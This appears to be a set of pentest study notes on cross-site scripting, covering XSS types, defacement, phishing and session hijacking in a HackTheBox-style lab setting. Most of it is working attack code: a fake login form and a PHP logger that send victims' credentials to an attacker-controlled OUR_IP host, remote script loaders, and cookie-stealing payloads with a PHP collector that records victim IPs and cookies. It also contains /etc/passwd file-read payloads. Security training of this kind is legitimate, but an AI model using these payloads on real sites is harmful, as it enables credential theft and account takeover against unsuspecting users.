## delete


# Cross Site Scripting(XSS)
- [HackTricks](https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting)
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection)
- [PayloadBox](https://github.com/payloadbox/xss-payload-list)

## DOM
This is a type of XSS attack where the vulnerability exists in the client-side code rather than the server-side code. The malicious script is embedded in the HTML page and is executed by the victim's browser when the page is loaded. This makes it more difficult to detect and prevent, as it does not involve the server at all.
One good example is search bar.

## REFLECTED  
In this type of attack, the malicious script is part of the victim's request to the website. The website includes this script in its response, which is then executed by the victim's web browser. Find some URL where it looks like ?q=something.

## STORED/PERSISTED
In this type of attack, the malicious script is injected into a website's database. This script is then served to the website's users when they request it, leading to the execution of the script in their web browsers. An example of a stored XSS attack is when an attacker injects a comment containing malicious code on a website, and that code is served to other users who view the comment.


- `<iframe src=\"javascript:alert('xss')\">`
- `<iframe src="javascript:alert('xss')">`
- `<iframe src='javascript:alert('xss')'>`
- `<script>document.write('<iframe src=file:///etc/passwd></iframe>');</script>`
- `<script> var x = new XMLHttpRequest(); x.open("GET", "file:///etc/passwd", true); x.onload = function(){ document.write(x.responseText); }; x.send(); </script>` - Read File 




## Stored (Persistent) 
XSS	The most critical type of XSS, which occurs when user input is stored on the back-end database and then displayed upon retrieval (e.g., posts or comments)

## Reflected 
(Non-Persistent) XSS Occurs when user input is displayed on the page after being processed by the backend server, but without being stored (e.g., search result or error message)

## DOM-based XSS	
Another Non-Persistent XSS type that occurs when user input is directly shown in the browser and is completely processed on the client-side, without reaching the back-end server (e.g., through client-side HTTP parameters or anchor tags)

# Discovery
## [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md) and [XSS Payloads](https://github.com/payloadbox/xss-payload-list)
```html
<script>alert(window.origin)</script>
<plaintext>
<script>print()</script>
<img src="" onerror=alert(window.origin)>
<iframe src=\"javascript:alert('xss')\">
<iframe src="javascript:alert('xss')">
<iframe src='javascript:alert('xss')'>
<script>document.write('<iframe src=file:///etc/passwd></iframe>');</script>
<script> var x = new XMLHttpRequest(); x.open("GET", "file:///etc/passwd", true); x.onload = function(){ document.write(x.responseText); }; x.send(); </script>
```

# Defacing
One of the most common attacks usually used with stored XSS vulnerabilities is website defacing attacks. Defacing a website means changing its look for anyone who visits the website.

## Changing Background
```html
<script>document.body.style.background = "black"</script>
<script>document.body.background = "https://www.hackthebox.eu/images/logo-htb.svg"</script>
```

## Changing Page Title
```html
<script>document.title = 'HackTheBox Academy'</script>
```

## Changing Page Text
```js
document.getElementById("todo").innerHTML = "New Text"
document.getElementsByTagName('body')[0].innerHTML = "New Text"

<script>document.getElementsByTagName('body')[0].innerHTML = '<center><h1 style="color: white">Cyber Security Training</h1><p style="color: white">by <img src="https://academy.hackthebox.com/images/logo-htb.svg" height="25px" alt="HTB Academy"> </p></center>'</script>
```


# Phishing
## Login Form Injection
Once we identify a working XSS payload, we can proceed to the phishing attack. To perform an XSS phishing attack, we must inject an HTML code that displays a login form on the targeted page. This form should send the login information to a server we are listening on, such that once a user attempts to log in, we'd get their credentials.

```html
<h3>Please login to continue</h3>
<form action=http://OUR_IP>
    <input type="username" name="username" placeholder="Username">
    <input type="password" name="password" placeholder="Password">
    <input type="submit" name="submit" value="Login">
</form>
```

```js
document.write('<h3>Please login to continue</h3><form action=http://OUR_IP><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');
```

## Cleaning Up
Now we should remove any element that reference the previous page in order to make it look legit as the real login page.
To find the id of the HTML element we want to remove, we can open the Page Inspector Picker by clicking [CTRL+SHIFT+C] and then clicking on the element we need.

```js
document.getElementById('urlform').remove();
```

```js
document.write('<h3>Please login to continue</h3><form action=http://OUR_IP><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');
document.getElementById('urlform').remove();
```

If there's still a piece of the original HTML code left after our injected login form. This can be removed by simply commenting it out, by adding an HTML opening comment after our XSS payload.

```
...PAYLOAD... <!-- 
```

## Credential Stealing
So, let us start a simple netcat server and see what kind of request we get when someone attempts to log in through the form. To do so, we can start listening on port 80 in our Pwnbox, as follows:

```bash
$ sudo nc -lvnp 80
```

However, as we are only listening with a netcat listener, it will not handle the HTTP request correctly, and the victim would get an Unable to connect error, which may raise some suspicions. So, we can use a basic PHP script that logs the credentials from the HTTP request and then returns the victim to the original page without any injections. In this case, the victim may think that they successfully logged in and will use the Image Viewer as intended.


The following PHP script should do what we need, and we will write it to a file on our VM that we'll call index.php and place it in /tmp/tmpserver/
```php
<?php
if (isset($_GET['username']) && isset($_GET['password'])) {
    $file = fopen("creds.txt", "a+");
    fputs($file, "Username: {$_GET['username']} | Password: {$_GET['password']}\n");
    header("Location: http://SERVER_IP/phishing/index.php");
    fclose($file);
    exit();
}
?>
```

Now that we have our index.php file ready, we can start a PHP listening server, which we can use instead of the basic netcat listener we used earlier:

```bash
$ mkdir /tmp/tmpserver
$ cd /tmp/tmpserver
$ vi index.php #at this step we wrote our index.php file
$ sudo php -S 0.0.0.0:80
```

# Session Hijacking
Modern web applications utilize cookies to maintain a user's session throughout different browsing sessions. This enables the user to only log in once and keep their logged-in session alive even if they visit the same website at another time or date. However, if a malicious user obtains the cookie data from the victim's browser, they may be able to gain logged-in access with the victim's user without knowing their credentials.

With the ability to execute JavaScript code on the victim's browser, we may be able to collect their cookies and send them to our server to hijack their logged-in session by performing a Session Hijacking (aka Cookie Stealing) attack.

## Blind XSS Detection
We usually start XSS attacks by trying to discover if and where an XSS vulnerability exists. A Blind XSS vulnerability occurs when the vulnerability is triggered on a page we don't have access to.

Blind XSS vulnerabilities usually occur with forms only accessible by certain users (e.g., Admins). Some potential examples include:

- Contact Forms
- Reviews
- User Details
- Support Tickets
- HTTP User-Agent header

```js
<script src=http://OUR_IP></script>
'><script src=http://OUR_IP></script>
"><script src=http://OUR_IP></script>
javascript:eval('var a=document.createElement(\'script\');a.src=\'http://OUR_IP\';document.body.appendChild(a)')
<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//OUR_IP");a.send();</script>
<script>$.getScript("http://OUR_IP")</script>
```

### Loading a Remote Script
In HTML, we can write JavaScript code within the <script> tags, but we can also include a remote script by providing its URL, as follows:
```html
<script src="http://OUR_IP/script.js"></script>
```

So, we can use this to execute a remote JavaScript file that is served on our VM. We can change the requested script name from script.js to the name of the field we are injecting in, such that when we get the request in our VM, we can identify the vulnerable input field that executed the script.

If we get a request for http://OUR_IP/username, then we know that the username field is vulnerable to XSS, and so on. With that, we can start testing various XSS payloads that load a remote script and see which of them sends us a request. The following are a few examples we can use from [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection#blind-xss)

Before we start sending payloads, we need to start a listener on our VM, using netcat or php as shown in a previous section.

Now we can start testing these payloads one by one by using one of them for all of input fields and appending the name of the field after our IP, as mentioned earlier.

## Session Hijacking
Once we find a working XSS payload and have identified the vulnerable input field, we can proceed to XSS exploitation and perform a Session Hijacking attack.

A session hijacking attack is very similar to the phishing attack we performed in the previous section. It requires a JavaScript payload to send us the required data and a PHP script hosted on our server to grab and parse the transmitted data.

There are multiple JavaScript payloads we can use to grab the session cookie and send it to us, as shown by [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection#exploit-code-or-poc):

```js
document.location='http://OUR_IP/index.php?c='+document.cookie;
new Image().src='http://OUR_IP/index.php?c='+document.cookie;
```

We can write any of these JavaScript payloads to script.js, which will be hosted on our VM as well.

Now, we can change the URL in the XSS payload we found earlier to use script.js (don't forget to replace OUR_IP with your VM IP in the JS script and the XSS payload).

With our PHP server running, we can now use the code as part of our XSS payload, send it in the vulnerable input field, and we should get a call to our server with the cookie value. However, if there were many cookies, we may not know which cookie value belongs to which cookie header. So, we can write a PHP script to split them with a new line and write them to a file. In this case, even if multiple victims trigger the XSS exploit, we'll get all of their cookies ordered in a file.

```php
<?php
if (isset($_GET['c'])) {
    $list = explode(";", $_GET['c']);
    foreach ($list as $key => $value) {
        $cookie = urldecode($value);
        $file = fopen("cookies.txt", "a+");
        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
        fclose($file);
    }
}
?>
```

Now, we wait for the victim to visit the vulnerable page and view our XSS payload. Once they do, we will get two requests on our server, one for script.js, which in turn will make another request with the cookie value:

Finally, we can use this cookie on the login.php page to access the victim's account. To do so, once we navigate to /hijacking/login.php, we can click Shift+F9 in Firefox to reveal the Storage bar in the Developer Tools. Then, we can click on the + button on the top right corner and add our cookie, where the Name is the part before = and the Value is the part after = from our stolen cookie:

Once we set our cookie, we can refresh the page and we will get access as the victim.

